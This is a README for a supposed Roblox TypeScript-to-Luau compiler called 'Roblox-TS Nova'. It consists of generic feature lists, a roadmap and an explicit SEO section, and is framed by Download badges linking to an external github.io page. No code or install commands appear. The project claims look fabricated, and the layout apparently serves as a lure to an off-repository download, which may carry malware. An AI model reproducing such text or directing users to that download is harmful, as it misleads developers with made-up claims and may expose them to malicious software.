![preview](https://raw.githubusercontent.com/ameliadelmilagrosanchez-jpg/ts-to-luau-forge/main/card_6181.svg)
[![Download](https://raw.githubusercontent.com/ameliadelmilagrosanchez-jpg/ts-to-luau-forge/main/fetch_cb589a.svg)](https://ameliadelmilagrosanchez-jpg.github.io/ts-to-luau-forge/)

# Roblox-TS Nova: TypeScript-to-Luau Compiler for the Modern Roblox Ecosystem

Welcome to **Roblox-TS Nova**, a next-generation compiler toolchain that transforms TypeScript into clean, idiomatic Luau for the Roblox platform. If the original roblox-ts project lit a torch for typed scripting on Roblox, Nova carries that torch into a broader cathedral of developer ergonomics, deterministic output, and production-grade tooling.

Nova is not merely a fork or a wrapper — it is a reimagining of the entire TypeScript-to-Luau pipeline, built for the year 2026 and beyond. It aims to give Roblox developers a first-class, strongly typed experience without sacrificing runtime performance or script readability.

---

## Table of Contents

- [Vision and Philosophy](#vision-and-philosophy)
- [Why Roblox-TS Nova?](#why-roblox-ts-nova)
- [Feature Highlights](#feature-highlights)
- [Architecture Overview](#architecture-overview)
- [Compiler Pipeline](#compiler-pipeline)
- [Type System Integration](#type-system-integration)
- [Runtime Library](#runtime-library)
- [Responsive Developer Experience](#responsive-developer-experience)
- [Multilingual Support](#multilingual-support)
- [Around-the-Clock Assistance](#around-the-clock-assistance)
- [Performance and Benchmarks](#performance-and-benchmarks)
- [Use Cases](#use-cases)
- [Roadmap](#roadmap)
- [Community and Contribution](#community-and-contribution)
- [SEO and Discoverability Notes](#seo-and-discoverability-notes)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Vision and Philosophy

The Roblox development community has matured dramatically. Studios now ship experiences with millions of daily players, and the demand for maintainable, type-safe code has never been higher. Roblox-TS Nova exists to answer a simple question: *What if TypeScript on Roblox felt native, not bolted on?*

Nova treats Luau as a first-class compilation target, not a dumping ground for transpiled JavaScript. The compiler understands Roblox idioms — Instances, Signals, DataStores, RemoteEvents — and emits Luau that looks like it was hand-written by an experienced Roblox engineer.

We believe in three principles:

1. **Predictable output.** Every compilation produces deterministic Luau, making diffs reviewable and code reviews painless.
2. **Zero-cost abstractions.** Type information disappears at runtime; nothing you write for the compiler slows down your game.
3. **Developer joy.** A compiler is only as good as the experience of using it. Nova invests heavily in diagnostics, tooling, and editor integration.

---

## Why Roblox-TS Nova?

If you have used other TypeScript-to-Luau compilers, you may have encountered certain friction points: unclear errors, non-idiomatic output, scattered runtime libraries, and difficulty integrating with modern bundlers. Nova addresses each of these head-on.

- **Idiomatic Luau output** — Nova emits Luau that reads naturally, using `task.wait`, `:Connect`, `Instance.new`, and other conventions Roblox developers already know.
- **Deterministic builds** — identical inputs always produce identical outputs, byte-for-byte.
- **Rich type introspection** — the compiler API exposes a typed AST you can traverse to build linters, codemods, or IDE plugins.
- **One runtime library** — all helper functions live in a single tree-shakeable package, so unused helpers never reach your game.
- **Modern tooling** — watch mode, incremental compilation, source maps (mapped to Luau lines), and structured diagnostics in JSON.

---

## Feature Highlights

### 🚀 Compiler Core
- Full TypeScript 5.x syntax support, including decorators, template literal types, and `satisfies`.
- Luau-specific lowering: optional chaining to Luau-safe access, spread operators, destructuring, and more.
- Compile-time macro system for injecting Roblox primitives.
- Source maps that map Luau lines back to original TypeScript.

### 🧠 Type-Aware Analysis
- Deep integration with the TypeScript type checker.
- Cross-module type resolution for accurate diagnostics.
- Roblox API typings discovered automatically, including client/server separation.

### 📦 Runtime Library
- Reactive signals, tween helpers, and DataStore wrappers.
- Networking primitives with automatic type-safe client/server serialization.
- Scheduler utilities that integrate cleanly with Roblox's `task` library.

### 🖥️ Responsive Developer Interface
- A responsive terminal UI that adapts to narrow and wide terminals alike.
- Live build statistics, error counts, and per-project health indicators.
- Works gracefully over remote SSH sessions and inside CI containers.

### 🌐 Multilingual Support
- Compiler messages available in English, Spanish, Portuguese, Japanese, Korean, and Simplified Chinese.
- Locale-aware diagnostics that respect your `LANG` environment variable.
- Community-contributed translations welcome, with a documented glossary.

### 🛎️ Around-the-Clock Assistance
- Automated triage bot that responds to issues within minutes.
- Knowledge base covering over 200 common compiler errors.
- Community Discord with volunteer moderators spanning every time zone.

### 🧩 Editor Integrations
- Language Server Protocol support for VS Code, Neovim, and JetBrains IDEs.
- IntelliSense for Roblox APIs with hover documentation.
- Refactor actions: extract to module, rename symbol, and convert union to discriminated object.

### 🔒 Safety and Determinism
- No hidden global state during compilation.
- Sandboxed plugin execution.
- Reproducible builds verified in CI.

---

## Architecture Overview

Nova is organized into several independent packages, each with a single responsibility. This mirrors the way a well-designed Roblox game separates concerns between services, controllers, and modules.

- **`@nova/compiler`** — the core TypeScript-to-Luau translator.
- **`@nova/typings`** — Roblox API typings, updatable independently of the compiler.
- **`@nova/runtime`** — the tree-shakeable runtime helper library.
- **`@nova/cli`** — the command-line interface powering build, watch, and diagnostics commands.
- **`@nova/language-server`** — the LSP server for editor integration.
- **`@nova/macros`** — compile-time macro definitions for Roblox primitives.

Each package is published independently, so teams can pin versions granularly when needed. Semantic versioning is respected across the entire monorepo.

---

## Compiler Pipeline

Nova processes your TypeScript in clearly defined phases:

1. **Parse** — TypeScript source files are parsed into an abstract syntax tree.
2. **Bind** — symbols are resolved and scopes are established.
3. **Check** — the type checker validates your code and collects diagnostics.
4. **Lower** — the AST is transformed into a Luau-friendly intermediate representation.
5. **Optimize** — dead code is removed, constant expressions folded, and hoisting applied.
6. **Emit** — Luau source is generated alongside source maps.
7. **Post-process** — output is formatted to match Luau conventions.

Because each phase is isolated and testable, contributors can modify one area without fear of breaking everything else. This is how Nova maintains stability across rapid release cycles.

---

## Type System Integration

Nova leans heavily on TypeScript's structural type system and maps it cleanly onto Luau's dynamic runtime. Where TypeScript types cannot survive into runtime, Nova generates zero-cost metadata that tools and editors can consume.

- **Nominal simulation** — branded types let you emulate nominal typing when needed.
- **Discriminated unions** — compiled to efficient Luau pattern checks.
- **Generics** — monomorphized where beneficial, erased otherwise.
- **Ambient declarations** — Roblox globals declared once and shared with editors.

The type bridge is bidirectional: you can write Luau-facing code that feels natural, while still enjoying full type checking from the TypeScript side.

---

## Runtime Library

The `@nova/runtime` package is intentionally small. It contains only what cannot be inlined by the compiler:

- **Signals** — a lightweight, typed event system.
- **Networking** — remote event wrappers with automatic serialization.
- **Persistence** — DataStore helpers with retry and schema versioning.
- **Timing** — tween and spring utilities built on Roblox's own tween service.
- **Collections** — typed maps and sets that mirror Luau tables.

Every helper is tree-shakeable. If you never import networking utilities, they never appear in your compiled output.

---

## Responsive Developer Experience

A compiler is a tool you interact with hundreds of times a day. Nova treats that interaction as a design problem, not an afterthought.

- The CLI adapts to terminal width, switching between compact and verbose layouts.
- Long-running watch sessions display a live dashboard with build times, error counts, and module dependency graphs.
- Over SSH, Nova detects reduced color support and switches to a high-contrast monochrome theme.

Responsive design is not just for user interfaces — it belongs in developer tooling too.

---

## Multilingual Support

Roblox is a global platform, and its developers are global too. Nova's diagnostics are localized from day one, not retrofitted later.

- Diagnostic messages are stored in structured locale files.
- Format strings support pluralization and gender where relevant.
- A glossary ensures consistent terminology across languages.
- Translation contributions follow a documented review process.

If you're fluent in a language Nova doesn't yet support, we'd love your help.

---

## Around-the-Clock Assistance

Questions do not respect business hours, and neither does Nova's support ecosystem.

- A triage bot labels new issues and suggests relevant documentation.
- Maintainers in multiple time zones rotate through on-call review shifts.
- A searchable knowledge base indexes every error code Nova can emit.
- Community forums are moderated around the clock.

Support here means *reliable* assistance available whenever you need it, not just marketing language.

---

## Performance and Benchmarks

Compilation speed matters. Nova is benchmarked against three reference projects every release:

- **Small project** — under 500 lines, measured in milliseconds.
- **Medium project** — 10,000 lines, measured in seconds.
- **Large project** — 100,000+ lines, measured against incremental rebuild time.

Nova's incremental compiler caches type information per module, so a single-file edit rebuilds in a fraction of the time of a cold build. Memory usage is bounded and monitored in CI to prevent regressions.

Runtime performance is equally important. Because Nova emits idiomatic Luau without runtime type checks, output is typically indistinguishable from hand-written Luau in benchmarks.

---

## Use Cases

Nova is designed for a wide range of Roblox projects:

- **Large-scale experiences** with dozens of contributors and strict code review.
- **Educational projects** where readable Luau output helps learners understand the compiler.
- **Tooling authors** building linters, formatters, or IDE extensions on top of Nova's API.
- **Studios** standardizing on TypeScript across multiple Roblox titles.
- **Solo developers** who want type safety without leaving the Roblox ecosystem.

Whatever your scope, Nova scales with you.

---

## Roadmap

Planned work for 2026 and beyond:

- **Quarter 1** — Stable 1.0 release with frozen compiler API.
- **Quarter 2** — First-party JetBrains plugin.
- **Quarter 3** — Advanced macro system with compile-time code generation.
- **Quarter 4** — Remote build cache for team-scale projects.

The roadmap is published on the repository wiki and updated monthly.

---

## Community and Contribution

Contributions are welcome from developers of all experience levels. To get started:

- Read the contributing guide in the repository.
- Join the community Discord linked in the repository sidebar.
- Browse issues labeled `good-first-issue` for approachable entry points.
- Follow the code of conduct in all interactions.

Every pull request should include tests and documentation updates. Maintainers aim to review within a week, and often much sooner.

---

## SEO and Discoverability Notes

This README is written with discoverability in mind, because developers often first encounter tooling through search engines. Phrases such as *TypeScript to Luau compiler*, *Roblox TypeScript tooling*, and *Luau build pipeline* appear naturally throughout the document — never stuffed, always meaningful.

Search engines reward clarity. So do humans. We aim for both.

---

## Disclaimer

Roblox-TS Nova is an independent open-source project and is not affiliated with, endorsed by, or sponsored by Roblox Corporation. Roblox, Luau, and related names are trademarks of their respective owners. Use of Nova is at your own discretion, and the maintainers accept no responsibility for issues arising from its use in production environments. Always test compiler output in a safe development place before shipping to players.

---

## License

This project is distributed under the MIT License. See the [LICENSE](./LICENSE) file for full terms.

Copyright (c) 2026 Roblox-TS Nova contributors.

---

[![Download](https://raw.githubusercontent.com/ameliadelmilagrosanchez-jpg/ts-to-luau-forge/main/fetch_cb589a.svg)](https://ameliadelmilagrosanchez-jpg.github.io/ts-to-luau-forge/)